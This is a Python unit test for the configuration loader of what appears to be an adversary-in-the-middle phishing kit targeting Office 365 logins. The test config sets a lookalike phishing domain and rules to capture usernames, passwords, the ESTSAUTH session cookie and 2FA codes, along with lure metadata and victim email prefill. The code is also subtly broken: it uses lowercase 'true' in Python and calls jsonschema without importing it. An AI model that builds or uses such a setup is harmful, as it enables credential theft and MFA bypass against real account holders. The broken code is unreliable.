import unittest
import json
from config import load_config

class TestConfig(unittest.TestCase):
    def test_valid_config(self):
        with open('configs/o365.json', 'w') as f:
            json.dump({
                "service_name": "office365",
                "target_domain": "login.microsoftonline.com",
                "phishing_domain": "o365-login.com",
                "port": 443,
                "ssl": {"enabled": true, "auto_generate": true, "cert_path": "cert.pem", "key_path": "key.pem"},
                "redirect_url": "https://www.office.com",
                "capture_rules": {
                    "credentials": [{"field": "username", "selector": "loginfmt"}, {"field": "password", "selector": "passwd"}],
                    "cookies": ["ESTSAUTH"],
                    "2fa_token": "input[name='otc']"
                },
                "lure": {"og_title": "Sign In", "og_description": "Login", "favicon": "favicon.ico"},
                "logging": {"level": "DEBUG", "file": "test.log"},
                "storage": {"database": "test.db", "encrypt": true, "ttl_hours": 24},
                "analytics": {"enabled": true, "database": "test_analytics.db"},
                "link_format": {"use_email_fragment": true, "prefill_email": true}
            }, f)
        config = load_config('configs/o365.json')
        self.assertEqual(config['service_name'], 'office365')

    def test_invalid_config(self):
        with open('configs/invalid.json', 'w') as f:
            json.dump({"service_name": "invalid"}, f)
        with self.assertRaises(jsonschema.exceptions.ValidationError):
            load_config('configs/invalid.json')

if __name__ == '__main__':
    unittest.main()
